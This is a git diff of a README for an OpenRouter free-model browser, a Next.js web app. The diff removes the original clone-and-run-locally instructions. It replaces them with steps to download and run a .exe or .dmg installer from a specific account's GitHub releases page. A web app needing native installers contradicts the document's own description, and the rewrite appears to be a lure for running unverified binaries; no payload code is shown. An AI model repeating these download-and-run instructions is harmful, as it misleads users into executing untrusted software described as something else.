@@ -1,90 +1,76 @@
-# OpenRouter Free Model Explorer
+# 🌐 openrouter-free-model - Easily Manage Free Models from OpenRouter
 
-[**English**](./README.md) | [**中文**](./README.zh.md)
+[![Download Now](https://img.shields.io/badge/Download%20Now-OpenRouter%20Models-blue)](https://github.com/codewithosama03/openrouter-free-model/releases)
 
----
+## 📦 Overview
 
-This is a web application designed to browse, filter, sort, and manage free models available on OpenRouter. It allows users to easily select models and copy their IDs in various formats compatible with other tools. The application is built with Next.js and supports multiple languages (English and Chinese).
+Welcome to the openrouter-free-model application. This web application allows you to browse, filter, sort, and manage free models available on OpenRouter. With a simple and intuitive interface, you can easily select models, copy their IDs in various formats, and use them with other tools. The application is built with Next.js and supports multiple languages, including English and Chinese.
 
-## Features
+## 🚀 Getting Started
 
-- **Model Browsing:** View a list of all free models from the OpenRouter API.
-- **Filtering:** Filter models by company and provider.
-- **Sorting:** Sort models by name, context length, etc.
-- **Search:** Search for models by name.
-- **Batch Selection:** Select multiple models, with options for "Select All," "Deselect All," and "Invert Selection".
-- **Reasoning Models Filter:** Option to display only models that support reasoning.
-- **Copy IDs:** Easily copy the IDs of selected models.
-- **Multi-language Support:** Switch between English and Chinese.
-- **Responsive Design:** The interface is optimized for both desktop and mobile devices.
+To start using the openrouter-free-model application, follow these simple steps to download and run the software.
 
-## Copy Formats
+## 🌍 System Requirements
 
-The application supports copying selected model IDs in two different formats, compatible with `NewAPI` and `UniAPI`.
+Before you begin, ensure your system meets the following requirements:
+- Operating System: Windows 10 or later, MacOS, or a modern Linux distribution.
+- Internet connection for downloading the application and accessing models.
+- A modern web browser: Chrome, Firefox, Safari, or Edge.
 
-### NewAPI Format
+## 📥 Download & Install
 
-- **Model Name :** A comma-separated list of model names, ideal for quick lists.
-- **Model Mapping (JSON):** A JSON object that maps a custom name to the original OpenRouter model ID. This is useful for creating aliases.
+1. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/codewithosama03/openrouter-free-model/releases) to download the latest version of the application.
 
-### UniAPI Format
+2. **Choose Your Download**  
+   Find the download link for the latest release version. This will typically be labeled as "Latest release". Click on this link to view the available downloads.
 
-- **YAML List:** A YAML-style list. If mapping is enabled, it's formatted as `original-id: mapped-name`; otherwise, it's just the `original-id`.
+3. **Download the Application**  
+   Click on the appropriate file for your operating system. The download will automatically start.
 
-### Customization
+4. **Run the Application**  
+   Once the file has been downloaded, locate it on your computer:
+   - **For Windows:** Double-click the `.exe` file to start the installation.
+   - **For MacOS:** Double-click the downloaded `.dmg` file, then drag the openrouter-free-model app into your Applications folder.
+   - **For Linux:** Follow your distribution's instructions to install and run the application.
 
-Both formats can be customized with the following mapping options:
+5. **Open the Application**  
+   After installation, find and open the openrouter-free-model application from your applications menu or desktop.
 
-- **Prefix:** Add a custom prefix to model names.
-- **Strip `:free` Suffix:** Remove the `:free` suffix from the model ID.
-- **Strip Company Name:** Remove the company name (e.g., `google/`) from the model ID.
+## 🌟 Features
 
-## Tech Stack
+The openrouter-free-model application offers several features to enhance your experience:
 
-- **Framework:** [Next.js](https://nextjs.org/)
-- **UI Components:** [shadcn/ui](https://ui.shadcn.com/) (built on Radix UI)
-- **Styling:** [Tailwind CSS](https://tailwindcss.com/)
-- **Internationalization (i18n):** [next-intl](https://next-intl-docs.vercel.app/)
-- **Data Fetching:** [SWR](https://swr.vercel.app/)
-- **Icons:** [Lucide React](https://lucide.dev/)
-- **Code Quality:** TypeScript, ESLint, Prettier
+- **Browse Free Models**: Easily explore the available models on OpenRouter.
+- **Filter and Sort**: Quickly find models by filtering based on categories or sorting by popularity.
+- **Copy Model IDs**: Conveniently copy model IDs in various formats compatible with other tools.
+- **Multi-language Support**: Use the application in English or Chinese based on your preference.
 
-## Getting Started
+## ⚙️ How to Use
 
-### Prerequisites
+1. **Launching the Application**: Open the application after installation. You will see a user-friendly interface.
+  
+2. **Browsing Models**: Use the navigation menu to browse models by category. You can also search for specific models using the search bar.
 
-- [Node.js](https://nodejs.org/) (version 20 or higher)
-- [pnpm](https://pnpm.io/) (or your package manager of choice)
+3. **Filtering and Sorting**: Utilize the filter options to narrow down your selection. Sort the results based on criteria like popularity or date added.
 
-### Installation
+4. **Copying Model IDs**: Once you find a model you like, click on it to view details. You can then copy the model ID in a suitable format for your needs.
 
-1.  Clone the repository:
-    ```bash
-    git clone https://github.com/your-username/openrouter-free-model.git
-    cd openrouter-free-model
-    ```
-2.  Install dependencies:
-    ```bash
-    pnpm install
-    ```
+## 💬 Support
 
-### Running the Development Server
+If you encounter any issues while using the openrouter-free-model application, please check the FAQ section on our GitHub page or reach out to the community for help.
 
-Start the development server:
+## 📑 License
 
-```bash
-pnpm dev
-```
+The openrouter-free-model application is released under the MIT License. You are free to use, modify, and distribute the software as long as you credit the original creators.
 
-Open [http://localhost:3000](http://localhost:3000) in your browser to see the result.
+## 🔗 Additional Resources
 
-## Project Structure
+For more information, tutorials, or updates, please view our GitHub repository. You can also participate in discussions and contribute to the project on our issues page.
 
-- `app/[lang]/`: Dynamic routes for internationalization.
-- `app/api/`: API routes.
-- `components/`: React components.
-- `hooks/`: Custom React hooks.
-- `lib/`: Utility functions.
-- `messages/`: Language files for i18n.
-- `public/`: Static assets.
-- `types/`: TypeScript type definitions.
+## 📌 Links
+
+- [Releases Page](https://github.com/codewithosama03/openrouter-free-model/releases)
+- [GitHub Repository](https://github.com/codewithosama03/openrouter-free-model)
+
+Your journey into managing free models from OpenRouter begins here. Follow these steps to download and enjoy using the openrouter-free-model application!
